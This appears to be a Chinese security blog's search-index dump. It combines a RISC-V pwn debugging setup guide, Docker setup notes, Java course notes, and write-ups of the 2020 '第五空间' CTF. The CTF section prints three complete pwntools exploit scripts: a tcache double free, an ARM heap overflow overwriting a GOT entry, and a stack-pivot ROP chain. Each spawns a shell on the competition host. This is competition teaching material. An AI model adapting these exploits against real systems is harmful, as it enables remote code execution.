ra,FUN_000101ec undefined FUN_000101ec() 000101c4 aa 87 c.mv a5,a0 000101c6 17 05 00 00 auipc a0,0x0 000101ca 13 05 a5 23 addi a0=\u003eLAB_00010400 ,a0,0x23a 000101ce 82 65 c.ldsp a1,0x0 =\u003eStack [0x0 ](sp) 000101d0 30 00 c.addi4s a2,sp,0x8 000101d2 13 71 01 ff andi sp,sp,-0x10 000101d6 97 16 00 00 auipc a3,0x1 000101da 93 86 a6 54 addi a3=\u003eLAB_00011720 ,a3,0x54a 000101de 17 17 00 00 auipc a4,0x1 000101e2 13 07 27 5d addi a4=\u003eLAB_000117b0 ,a4,0x5d2 000101e6 0a 88 c.mv a6,sp 000101e8 6f 10 40 0a j FUN_0001128c undefined FUN_0001128c() -- Flow Override: CALL_RETURN (CALL_TERMINATOR) ************************************************************* * FUNCTION ************************************************************* undefined FUN_000101ec () assume gp = 0x6f178 undefined a0:1 \u003cRETURN\u003e FUN_000101ec XREF[3]: entry:000101c0 (c) , 00011762 (c) , 0006cb80 (*) 000101ec 97 f1 05 00 auipc gp,0x5f 000101f0 93 81 c1 f8 addi gp,gp,-0x74 000101f4 82 80 ret 全选以后ctrl-R，将gp改对即可。 ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:1:2","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"动态调试 ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:2:0","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"qemu+gdb调试 先去掉~/.gdbinit的pwndbg等启动命令，使用原生gdb（如果pwn环境安装在py3中，可以使用gef） source ~/pwndbg/gdbinit.py source ~/GdbPlugins/gef/gef.py 调试脚本，gdb连本地23333端口来连 #!/bin/sh gdb-multiarch -q \\ -ex 'set architecture riscv:rv64' \\ -ex 'file main' \\ -ex 'target remote localhost:23333' \\ -ex 'break *0x0010582'\\ -ex continue \\ ; 攻击脚本，用qemu在23333端口开一个程序并进行攻击（这里题目给了qemu，也可以用自己的） io = process([\"./qemu-riscv64\" , \"-g\", \"23333\" ,\"./main\"], aslr=False) 原生gdb比较简陋，并且功能不够强大，暂时只能凑合着用了 重新学一下gdb指令… Breakpoint 1, 0x0000000000010452 in ?? () (gdb) x/10xi 0x10452 =\u003e 0x10452: jal ra,0x204e4 0x10456: mv a3,a0 0x10458: lw a4,-1952(gp) 0x1045c: lw a5,-1948(gp) 0x10460: addw a5,a5,a4 0x10462: sext.w a5,a5 0x10464: slli a5,a5,0x20 0x10466: srli a5,a5,0x20 0x10468: bne a3,a5,0x10570 0x1046c: lw a5,-1952(gp) (gdb) info registers ra 0x1044c 0x1044c sp 0x40007ffff0 0x40007ffff0 gp 0x6f178 0x6f178 tp 0x71700 0x71700 t0 0x0 0 t1 0x1a3f2 107506 t2 0x71f93 466835 fp 0x40008001f0 0x40008001f0 s1 0x117b0 71600 a0 0x40008000c8 274886295752 a1 0x6d523 447779 a2 0x1 1 a3 0x0 0 a4 0x1 1 a5 0x40008000c8 274886295752 a6 0xfffffffffbad208b -72540021 a7 0x3f 63 s2 0x0 0 s3 0x0 0 s4 0x0 0 s5 0x0 0 s6 0x0 0 s7 0x0 0 s8 0x0 0 s9 0x0 0 s10 0x0 0 s11 0x0 0 t3 0x8101010101010100 -9151031864016699136 t4 0x2f 47 t5 0x1 1 t6 0x0 0 pc 0x10452 0x10452 (gdb) gef可以通过gdb-multiarch -p pid号来使用，但是寄存器等却无法正确识别，原因不明 可以看到能正确解析risc-v的指令与寄存器。如果不行也许得先安装一下gcc-riscv64-linux-gnu sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu 具体见参考资料[2] 经过测试，以下常用工具都不支持risc-v… ROP_gadget (pwn) pwn@ubuntu:~/share/starctf/favourite_architecture/share$ ROPgadget --binary ./main --only \"ldsp\" [Error] ELF.getArch() - Architecture not supported [Error] ELF.getArch() - Architecture not supported gef/pwndbg/peda/gdbinit均出现以下类似的exception （个人问题，貌似是py3的锅） (pwn) pwn@ubuntu:~/share/starctf/favourite_architecture/share$ gdb-multiarch -q ./main GEF for linux ready, type `gef' to start, `gef config' to configure 50 commands loaded for GDB 9.2 using Python engine 3.8 [*] 4 commands could not be loaded, run `gef missing` to know why. Reading symbols from ./main... (No debugging symbols found in ./main) Python Exception \u003cclass '__main__.GefUnsupportedOS'\u003e 'CPU type is currently not supported: riscv:rv64': gef➤ set architecture riscv:rv64 The target architecture is assumed to be riscv:rv64 gef➤ r Starting program: /mnt/hgfs/linux_share/starctf/favourite_architecture/share/main /build/gdb-OxeNvS/gdb-9.2/gdb/i387-tdep.c:592: internal-error: void i387_supply_fxsave(regcache*, int, const void*): Assertion `tdep-\u003est0_regnum \u003e= I386_ST0_REGNUM' failed. A problem internal to GDB has been detected, further debugging may prove unreliable. This is a bug, please report it. For instructions, see: \u003chttp://www.gnu.org/software/gdb/bugs/\u003e. Aborted (core dumped) (pwn) pwn@ubuntu:~/share/starctf/favourite_architecture/share$ Input the flag: You are wrong ._. (pwn) pwn@ubuntu:~/share/starctf/favourite_architecture/share$ seccomp-tools乱码且报错 $ seccomp-tools dump ./main ./main: 12: ./main: �����\u003e�\"tEa��\"���#0��#\u0026��������7�#������ׇ��7��w�#���������7��w�#������ׇ��7��w�#��bda��9q�\"��#\u003c��#8��#4���7������5�\u003e��1I�7�����1F�5��\u003e���G�����#4��5����?몇��7��#��7���\u003e����骇��7��#��7���\u003e����窇��7��#��7���\u003e���_檇��7��#�5����䪇��7��#��7��\u003e���_㪇��7��#��7��\u003e����᪇��7��#��7��\u003e���ઇ��7��#��7��\u003e���ު���7��#�� �7��\u003e����ܪ���7��#�� �7��\u003e���?۪���7��#�� �7��\u003e����٪���7��#�� �7��#� 5�����ת���7��#�� �7���\u003e���֪���7��#�� �7���\u003e���Ԫ���7��#�� �7�����1F�5��\u003e���-�pBt!a���\"�#4��#0���7���7��#�� �7�����\u003e����Ϊ���7��������7��#��: File name too long ./main: 1: ./main: Syntax error: Unterminated quoted string ./main: 3: ./main: ���7������������ُ#: not found./main: 3: ./main: ���7�������������ُ#: not found ./main: 3: ./main: ���7�������������ُ#: not found ./main: 3: ./main: �����7�����k�������`f�G)�!��������``d�G\u003e��p^t ��\"���.�#\u0026����#$��������������@���W�Տ�\u003e�bda��yq\"�#\u003c��#\u0026��7��������ُ#: not found ./main: 3: ./main: cannot create ��7�: Directory non","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:2:1","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"参考资料 [1] https://github.com/NationalSecurityAgency/ghidra/issues/2466 [2] https://pdos.csail.mit.edu/6.828/2019/tools.html [3] https://www.cnblogs.com/iBinary/p/13852204.html ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:2:2","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"为获取2.27libc下pwn环境，虚拟机过于麻烦，遂启用docker。 ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:0:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"安装docker 执行这个命令后，脚本就会自动的将一切准备工作做好，并且把Docker CE 的Edge版本安装在系统中 sudo apt install curl curl -fsSL get.docker.com -o get-docker.sh sudo sh get-docker.sh --mirror Aliyun ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:1:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"启动docker服务 sudo systemctl enable docker sudo systemctl start docker ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:2:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"建立docker用户组 这一步是必须的，并且必须将当前用户加入docker用户组，否则权限不够。 sudo groupadd docker sudo usermod -aG docker $USER 然后log out注销当前ubuntu用户，再log in，使其生效。 ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:3:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"换源加速 sudo vi /etc/docker/daemon.json 按i进入插入模式后，在其中添加如下代码 { \"registry-mirrors\": [ \"https://registry.docker-cn.com\" ] } 再重新启动服务即可 sudo systemctl daemon-reload sudo systemctl restart docker ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:4:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"将镜像pull到本地 以pwndocker为例，https://github.com/voidzhakul/pwndocker docker pull registry.cn-shenzhen.aliyuncs.com/zhakul/docker:pwndocker 检查是否pull到本地，使用docker images命令查看本地镜像 $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE registry.cn-shenzhen.aliyuncs.com/zhakul/docker pwndocker cffec5c49ab5 2 months ago 1.66GB ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:5:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"将本地目录挂载到镜像中 将我们需要在docker中执行的文件挂载，并运行docker docker run -it -v /home/dock/Downloads:/usr/Downloads images /bin/bash 通过-v参数，冒号前为宿主机目录，必须为绝对路径，冒号后为镜像内挂载的路径，images使用上述提到的REPOSITORY:TAG格式。 ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:6:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"退出、进入容器 退出容器 root@c8cb9d4168c7:## exit 查看所有产生的容器 $ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES c8cb9d4168c7 registry.cn-shenzhen.aliyuncs.com/zhakul/docker:pwndocker \"/bin/bash\" 16 minutes ago Exited (0) 6 minutes ago crazy_kilby f140ab8db11d registry.cn-shenzhen.aliyuncs.com/zhakul/docker:pwndocker \"/bin/bash\" 49 minutes ago Exited (0) 46 minutes ago upbeat_davinci b43caf8776df registry.cn-shenzhen.aliyuncs.com/zhakul/docker:pwndocker \"/bin/bash\" 59 minutes ago Exited (0) 19 minutes ago frosty_easley 镜像是静态的。而容器是动态的，类似于镜像的一个实例。如果要重新进入某个容器crazy_kilby docker start crazy_kilby 其容器会在后台运行，attach后即可交互 docker attach crazy_kilby ","date":"2020-06-28","objectID":"/2020/06/pwn-docker/:7:0","tags":null,"title":"Ubuntu16.04 docker环境搭建","uri":"/2020/06/pwn-docker/"},{"categories":["PWN"],"content":"By X1do0@Lilac, wxk@Lilac ","date":"2020-06-25","objectID":"/2020/06/5space2020/:0:0","tags":null,"title":"“第五空间”网络安全挑战赛 2020","uri":"/2020/06/5space2020/"},{"categories":["PWN"],"content":"of 这题给的C文件与服务器上不同，实际上远程的remove功能并没有清除堆存储cookie的位置…(葵佬透视挂实锤了) 所以是tcache入门题了…double free即可 from pwn import * from time import sleep import sys global io context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] filename = \"./of_27\" ip = \"121.36.74.70\" port = 9999 LOCAL = True if len(sys.argv)==1 else False elf = ELF(filename) remote_libc = \"./libc-2.27.so\" if LOCAL: io = process(filename) libc = elf.libc else: context.log_level = 'debug' io = remote(ip, port) libc = ELF(remote_libc) def choice( idx): io.sendlineafter( \"choice: \", str(idx)) def lg(name, val): log.info(name+\" : \"+hex(val)) def add( idx): choice( 1) io.sendlineafter( \"Index: \", str(idx)) io.recvuntil( \"!\\n\") def edit( idx, data): choice( 2) io.sendlineafter( \"Index: \", str(idx)) io.sendafter( \"Content: \", data) def show( idx): choice( 3) io.sendlineafter( \"Index: \", str(idx)) io.recvuntil( \"Content: \") def rm( idx): choice( 4) io.sendlineafter( \"Index: \", str(idx)) add( 0) add( 1) rm( 0) rm( 0) show( 0) heap_addr = u64(io.recv( 6) + '\\0\\0') lg(\"heap_addr\", heap_addr) for i in range(6): rm( 0) show( 0) libc_addr = u64(io.recv( 6) + '\\0\\0') libc.address = libc_addr - (0x3afca0 if LOCAL else 0x3ebca0) lg(\"heap_addr\", heap_addr) lg(\"libc_addr\", libc_addr) lg('libc base', libc.address) edit( 0, p64(libc.symbols['__free_hook'])) add( 2) add( 3) edit( 3, p64(libc.symbols['system'])) edit( 2, \"/bin/sh;\\0\") rm( 2) io.interactive() ","date":"2020-06-25","objectID":"/2020/06/5space2020/:1:0","tags":null,"title":"“第五空间”网络安全挑战赛 2020","uri":"/2020/06/5space2020/"},{"categories":["PWN"],"content":"pwnme ARM智障堆题…环境装了一下午，头秃。1kb的库是文本文件，打开后手动软链接才能执行。 不是很懂ARM…找了个调试模板瞎试出来了，大概类似于fastbin attack吧，简单堆溢出 from pwn import * import sys context.binary = \"./a.out\" LOCAL = False if not LOCAL: io = remote(\"121.36.58.215\", 1337) else: io = process([\"qemu-arm\", \"-g\", \"8080\", \"./a.out\"]) elf = ELF(\"./a.out\") libc = ELF(\"./lib/libuClibc-1.0.34.so\") context.log_level = \"debug\" context.terminal = ['tmux', 'splitw', '-h'] global bps # Break Points global gds # Gdb Debug Symbols bps = [] gds = {} def mydebug(p, s=''): def _get_bstr(): global bps b_str =\"\" for break_point in bps: if type(break_point) == int: b_str += \"b *%s\\n\"%(hex(break_point)) elif type(break_point) == str: b_str += \"b %s\\n\"%(break_point) else: pause(p, \"[_get_bstr] unsupported break point type : \"+str(break_point)) return b_str def _get_gds_str(): global gds res = \"\" for name in gds: val = gds[name] if type(name) != str: pause(p, \"[_get_gds_str] unsupported name type : \"+str(type(name))) if type(val) != int: pause(p, \"[_get_gds_str] unsupported val type : \"+str(type(val))) res += \"set $%s=%d\\n\"%(name, gds[name]) return res if not LOCAL: return gdb.attach(p, _get_bstr()+_get_gds_str()+s) gds['chunk_info'] = 0x21068 gds['chunk_cnt'] = 0x2106C gds['heap'] = 0x22010 # add # bps.append(0x10884) # free # bps.append(0x10AA0) # change # bps.append(0x109A4) bps.append(0x106F0) mydebug(io,\"target remote localhost:8080\") def show(): io.sendlineafter('\u003e\u003e\u003e ','1') def add(len,con): io.sendlineafter('\u003e\u003e\u003e ','2') io.sendlineafter(\"Length:\",str(len)) io.sendafter(\"Tag:\",con) def change(idx,len,con): io.sendlineafter('\u003e\u003e\u003e ','3') io.sendlineafter(\"Index:\",str(idx)) io.sendlineafter(\"Length:\",str(len)) io.sendafter(\"Tag:\",con) def remove(idx): io.sendlineafter('\u003e\u003e\u003e ','4') io.sendlineafter(\"Tag:\",str(idx)) add(0x18,'a'*8) add(0x18,'b'*8) add(0x18,'c'*8) add(0x21,'d'*8) remove(1) remove(2) pay1 = 'xxxx'*7 + p32(0x21)+ p32(0x22) + 'xxxx'*6 + p32(0x21) + p32(0x2107d) pay2 = 'xxxx'*7 + p32(0x21)+ p32(0x21072) change(0,0x70,pay2) add(0x18,'g'*8) add(0x18,'h'*8) add(0x18,'i'*8) pay3 = 'a'*0x10 + p32(4) + p32(elf.got['puts']) change(4,len(pay3),pay3) show() io.recvuntil(\"0 : \") puts_addr = u32(io.recv(4)) success(\"puts:\"+hex(puts_addr)) libc_base = puts_addr-libc.sym['puts'] success(\"libc:\"+hex(libc_base)) sys_addr = libc_base + libc.sym['system'] pay4 = 'a'*0x10 + p32(4) + p32(elf.got['free']) change(4,len(pay4),pay4) change(0,4,p32(sys_addr)) binsh = \"/bin/sh\\x00\" change(1,len(binsh),binsh) remove(1) io.interactive() ","date":"2020-06-25","objectID":"/2020/06/5space2020/:2:0","tags":null,"title":"“第五空间”网络安全挑战赛 2020","uri":"/2020/06/5space2020/"},{"categories":["PWN"],"content":"twice stack pivot花式rop技巧，利用两次leave ret通过修改rbp而控制rsp from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') io = remote(\"121.36.59.116\", 9999) main = 0x40087B io.sendafter(\"\u003e\", \"a\"*0x59) io.recvuntil(\"a\"*0x59) canary = u64('\\0'+io.recv(7)) stack = u64(io.recv(6) + '\\0\\0') plt_puts = 0x4005C0 plt_read = 0x4005F0 got_puts = 0x601020 got_read = 0x601038 PrdiR = 0x0000000000400923 PrsiPr15R = 0x0000000000400921 lr = 0x0000000000400879 rop = flat( PrdiR, got_puts, plt_puts, PrdiR, got_read, plt_puts, main, ) pay2 = fit({ 0: 'wxktql' + '\\0'*2, 8:rop, 0x58: flat(canary, stack-0x70, lr) }) io.sendafter(\"\u003e\", pay2) io.recvuntil('wxktql\\n') puts_addr = u64(io.recv(7)[:6] + '\\0\\0') read_addr = u64(io.recv(7)[:6] + '\\0\\0') libc_base = puts_addr - 0x06f690 io.sendafter(\"\u003e\", \"wxktql\\0\") io.recvuntil('wxktql\\n') io.sendafter(\"\u003e\", \"a\"*0x58 + p64(canary) + 'a'*8 + p64(libc_base+0x45216)) io.interactive() ","date":"2020-06-25","objectID":"/2020/06/5space2020/:3:0","tags":null,"title":"“第五空间”网络安全挑战赛 2020","uri":"/2020/06/5space2020/"},{"categories":["Course"],"content":"HIT cources review, derivate from CMU and MIT 6.005. (1) concepts of design for complex systems (2) object oriented programming (3) techniques for robustness, including testing and static and dynamic analysis for programs (4) concurrent software unit1，2 —\u003e 06/08 unit3 —\u003e 06/09,10 unit4 —\u003e 06/11 (06/12完成，咕得好哇) unit5 —\u003e 06/12 unit6 —\u003e 06/13 unit7 —\u003e 06/14 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:0:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 1-2 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:1:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target 软件构造的多维度视图 软件构造的阶段划分、各阶段的构造活动 内部/外部的质量指标 软件配置管理SCM与版本控制系统VCS Git的结构、工作原理、基本指令 GitHub ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:1:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context 软件构造的三个维度 按阶段分：build time（编译阶段） / run time（运行阶段） 按时间分：moment （瞬间）/ period （一段时期） 按层次分： code（源代码）/ component（架构） Version Control System(VCS) 与 Software Configuration Item(SCI) SCM：软件配置管理，用来追踪和控制软件的变化的任务。 SCI：软件配置项，软件中发生变化的基本单元（例如：文件） 版本控制系统略，git为重点 Software Development Lifecycle (SDLC) planning-\u003eanalysis-\u003edesign-\u003eimplementation-\u003etesting\u0026integration-\u003emaintenance-\u003eplanning… 传统软件开发模板 Waterfall（线性，不迭代），像瀑布一样顺序开发 Incremental （不迭代），将整个系统分为许多小块，一点一点地设计、开发、测试，直至 整个完成 V-Model （相对测试而言），是Waterfall的延申，完成源码开发后完善测试用例等，形成一个V形 Prototyping（迭代），开发软件原型，确定需求-\u003e开发初始原型-\u003e回顾-\u003e修正原型 Spiral（迭代），风险驱动 ，确定目标-\u003e识别并解决风险-\u003e开发与测试-\u003e继续迭代 Agile development 敏捷开发：把一个大项目分为多个相互联系，但也可独立运行的小项目，并分别完成，在此过程中软件一直处于可使用状态 敏捷开发与螺旋开发的区别 敏捷强调快速迭代，简单来说就是少些文档多做代码；螺旋本质上还是传统开放模式，要将文档写的很详细 敏捷的迭代速度要快于螺旋，通常一轮迭代也就1周；螺旋可能一两个月 软件的质量目标 外部质量目标：正确性、健壮性、可扩展性、复用性、兼容性（与其他东西兼容）、有效性、可移植性（移植到其他平台）、易用性、功能性、及时性等 内部质量目标：可读性、复杂性、大小 此课程涉及到： 代码优雅易于理解 -\u003e 代码的可理解性、函数规约；项目的可理解性 最大化复用 -\u003e ADT/OOP; 接口与实现分离;继承/重载/重写;组合/代理; 多态; 子类型与泛型编程; OO设计模式 可维护性 -\u003e 模块化设计; 聚合度/耦合度; SOLID; OO设计模式; 健壮性 -\u003e 异常处理、单元测试等 程序表现 -\u003e 多线程安全 Git结构 本地.git文件夹：工作区 暂存区（Staged）：并不实际存在，只是文件的一个标识，比如如果是0在暂存区域，1就不在；这样能把很多东西都先放在暂存区，然后一次性commit 仓库：远程仓储，已提交 Git与传统VCS的不同 传统的VCS版本更新时只记录改变量与原版本文件； Git每一个版本存的都是整个文件，但是不同版本相同的文件并不会复制一遍（多出一个指针指向原版本文件） Git存储的是文件，而不是文件的改变，这是与传统版本控制工具最大的区别 Git命令 Github 略 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:1:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 3 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:2:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target 基本数据类型、对象数据类型 静态类型检查、动态类型检查 Mutable/Immutable 值的改变、引用的改变 防御式拷贝 Snapshot diagram Specification、 前置/后置条件 行为等价性 观察等价性 规约的强度 ADT操作的四种类型 表示独立性 表示泄露 不变量、表示不变量RI 表示空间、抽象空间、 AF 以注释的形式撰写AF、 RI 接口、抽象类、具体类 继承、 override 多态、 overload 泛型 等价性equals()和== equals()的自反、传递、对称 hashCode() 不可变对象的引用等价性、对象等价性 可变对象的观察等价性、行为等价性 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:2:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context 基本数据类型、对象数据类型 java中所有变量类型分为两种（首字母大写的为对象数据类型，其余为基本类型） 基本数据类型 对象数据类型 int, long, byte, short, char, float, double, boolean 类、结构、数组、枚举等 只有值，相互无法区分 既有值又有ID 不可变 可变/不可变 在栈中分配内存 在堆中分配内存 内存代价小 内存代价大 静态类型检测、动态类型检测 静态类型检测：编译时检测类型，如语法、类名、函数名、函数参数、返回值类型等错误。检查类型。 动态类型检测：运行是检测类型，如非法的参数值（x/0）、非法的返回值、越界、空指针等。检查值。 不报错但是结果错误：整数溢出、double probability=1/5（0.0）等 Snapshot Diagram 对于基本类型的值，使用单线箭头指向实际值，不需要表明数据类型。 如果是可变对象，使用单线椭圆，椭圆内写明对象的类型及对象内的值。 如果是不可变对象，使用双线椭圆，椭圆内写明对象的类型及对象内的值。 如果是对象的不可变引用（final标记），使用双线箭头。eg：id 如果是对象的可变引用，使用单线箭头。eg：age 比较复杂的对象图 Array、List Set Map 可变与不可变类型 不可变类型变量：变量的值无法改变，只能改变引用；对其频繁修改会产生大量的临时拷贝，但更安全 注意String是不可变类型！Date是可变类型! 可变类型变量：变量的值可以改变；最小化拷贝 StringBuilder是可变类型： 考察下列代码： public static void main(String[] args){ String s1 = \"abc\"; List\u003cString\u003e list = new ArrayList\u003c\u003e(); list.add(s1); s1 = s1.concat(\"d\"); System.out.println(list.get(0)); //abd String s2 = s1.concat(\"e\"); list.set(0, s2); System.out.println(list.get(0)); //abcde } Snapshot与调试图如下，需要注意list.add以后并不是把s1直接放进list中，可以理解为做了拷贝 snapshot 调试图 值的改变与引用的改变 改变引用：将变量指向另一个值的存储空间 改变值：将当前指向的值的存储空间中写入一个新的值 final 关键词：修饰的变量无法改变引用；属于静态类型检测。 所以如果用final 修饰不可变类型，则无法再次赋值 final int a = 5; a = 10; (×) defensive copy 为防止用户传入或者传出给用户一个不可变ADT里的可变类型的引用，进而让用户获得不可变ADT的改变能力，使用防御使拷贝，比如下列Date类型返回时的拷贝方式： return new Date(groundhogAnswer.getTime()); pre/post-condition 前置条件：对客户端的约束，在使用方法时必须满足的条件 后置条件：对开发者的约束，方法结束时必须满足的条件 Java的前置、后置条件写在规约的@param 与@return 中 前置条件满足，则后置条件必须满足 前置条件不满足，则方法可做任何事情 规约与规约的强度 注意静态类型声明也是规约！ 规约不能暴露具体实现，应该使用抽象类型如List等字眼而不是LinkedList 规约更强 —\u003e 更放松的前置条件，更严格的后置条件，意味着开发者的工作越重、使用者的责任越轻 用图形表示规约强弱，更强的规约表现为更小的区域 （可以把区域的大小想成是实现方法的个数，规约更强实现方法会更少，所以区域小） 方法的行为等价性 站在用户的角度，两个方法（功能、pre/post-condition）是否相等 比如在数组中找某个只出现一次的值，从头开始找和从尾开始找的方法具有行为等价性 对象的行为等价性 所有方法都无法区分的两个对象是具有观察等价性的，一般这两个对象指向了同一块内存区域 对象的观察等价性 observer无法区分的两个对象是具有观察等价性的 ADT操作的四种类型 抽象数据类型（ADT）是由操作决定的，操作分为： 构造器：由其他类型产生此ADT类型 生产器：由此ADT类型产生另一个此类型的对象 观察器：由此ADT类型产生其他类型的变量 变值器：改变对象属性的方法，通常返回void 比如： Integer.valueOf() Creator BigInteger.mod() Producer List.addAll()String.toUpperCase() Producer Set.contains() Observer Map.keySet() Observer Collections.unmodifiableList() Producer BufferedReader.readLine() Mutator (改变了某个标记，表示当前位置) 需要注意不可变类型可能有mutator（beneficent mutation ），但必须在用户看来此ADT是不变的。 Representation Independence 表示独立性： client使用ADT时无需考虑其内部如何实现， ADT内部表示的变化不应影响外部spec和客户端 下图违反了表示独立性，因为Family的规约中并没有指出people是List，所以客户端不能直接用f.people.get （如果Family的内部实现变成了set，那么客户端也得跟着变） 应该将people改为private，然后利用getMembers()来访问。 表示暴露 ADT属性是public/返回了一个内部属性的引用给客户端/客户端传入了一个内部属性的引用 不变量 每个ADT都需要能维持某个量在任何时候总是true，这个量成为不变量 比如对于不可变类型的ADT，不可变就是它的不变量 AF \u0026 RI 表示(R)空间：ADT内部所有的变量对象构成的空间 抽象(A)空间：用户看ADT表示的内容构成的空间 抽象函数(AF)：从R到A的映射，一定是满射，但不一定是单射 R中的有可能有部分值并非合法的，在A中无映射值 表示不变量(RI)：表示空间中的子集，指示表示空间中数据的合法条件，应始终成立 checkRep随时检查RI是否成立，示意图如下： ADT的内部表示(私有属性)、R空间中的任何值、AF和RI应该对外部都应严格不可见 在注释中书写AF\u0026RI\u0026safe from rep 略，见实验 接口、抽象类、具体类 接口：interface，被implements 抽象类：abstract，被extends 继承与重写 严格继承：子类只能添加新方法，无法重写父类中的方法 重写方法与父类名字、参数列表、返回值类型完全相同，在运行阶段判断到底用哪个方法 final修饰方法， 则此方法不能被重写 final修饰类，则此类不能被继承 构造子类用到super()时只能放在第一行 多态与重载 java多态包括三种情况： 功能多态：函数重载 参数多态：泛型 子类型多态、包含多态：如果一个类有许多父类，则它代表了很多个父类 重载：多个方法具有同样的名字，但有不同的参数列表或返回值类型 ，在编译阶段判断到底用哪个方法 重载也可以发生在子类与父类之间 下图为一个易错的例子，说明对象类型得看声明，而不是new赋值的对象；特别需要注意3 泛型 泛型接口可以用泛型类实现，也可以用具体类实现 public interface Set\u003cE\u003e{...} public class CharSet implements Set\u003cCharacter\u003e{...} public class HashSet implements Set\u003cE\u003e{...} 通配符?只能在使用泛型时使用，不能在定义时使用 List\u003c?\u003e list = new ArrayList\u003cString\u003e(); List\u003c? extends Animal\u003e List\u003c? super Animal\u003e 运行时泛型便消失了，被具体类型代替 不能产生泛型数组 等价性 等价关系需要满足自反、对称、传递 == vs. equals() ==比较判断基本类型就是判断值是否相等，比较对象类型是判断引用是否相等 equals()判断对象引用是否相等（是否指向了同一块区域），与==相同 但是我们一般会对equals()重写（注意是重写并利用instanceof判断，千万不要重载）， 所以总的原则是基本类型用==，对象类型用equals() equals()相等的对象hashcode()一定要相等 instance of is a bad thing 使用instanceof判断某个父类属于不同子类便有不同的操作是一件不好的事情，这意味着父类的抽象封装不够，应该让子类重写父类的方法。 比如父类Animal有move()，而子类Bird有fly()，Fish有swim()，利用instanceof判断具体类型再调用对应方法是不好的，正确做法应该是Bird与Fish重写Animal的move() 可变对象的观察等价性、行为等价性 对可变类型来说，无需重写这两个函数，直接继承Object的两个方法即可 ，使用行为等价性 因为如果使用观察等价性，可变类型改变以后原先相等的对象便不再相等，会造成某些问题 比如set中添加了一个list，当list改变时set.contai","date":"2020-06-08","objectID":"/2020/06/software-engineering/:2:2","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Unit 4 ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:3:0","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Target Programing for/with reuse LSP 协变、反协变 数组的子类型化 泛型的子类型化 泛型中的通配符(?) Delegation Comparator和Comparable CRP原则 接口的组合 白盒框架的原理与实现 黑盒框架的原理与实现 设计模式adapter、 decorator、façade、 strategy、 template、iterator/iterable ","date":"2020-06-08","objectID":"/2020/06/software-engineering/:3:1","tags":null,"title":"软件构造（JAVA版）","uri":"/2020/06/software-engineering/"},{"categories":["Course"],"content":"Context java复用层次 源代码级别的复用 模块级别的复用：类/抽象类/接口 库级别的复用： API/包 系统级别的复用：框架（将framework看作是更大规模的API复用，除了提供可复用的API，还将这些模块之间的关系都确定下来，形成了整体应用的领域复用 ），比如.Net开发 java复用分类 白盒复用：源代码可见，可修改和扩展 ；复制已有代码 ，可进行修改 黑盒复用：源代码不可见，不能修改；只能通过API接口来使用，无法修改代码 白盒框架的原理与实现 白盒框架：通过代码层面的继承进行框架，通过子类型与重写方法扩展 黑盒框架的原理与实现 黑盒框架：通过实现特定接口/delegation进行框架扩展 Liskov替换原则（LSP） 里氏替换原则通俗的来讲就是：子类可以扩展父类的功能，但不能改变父类原有的功能。 具体包括： 子类可以实现父类的抽象方法，但不能覆盖父类的非抽象方法。 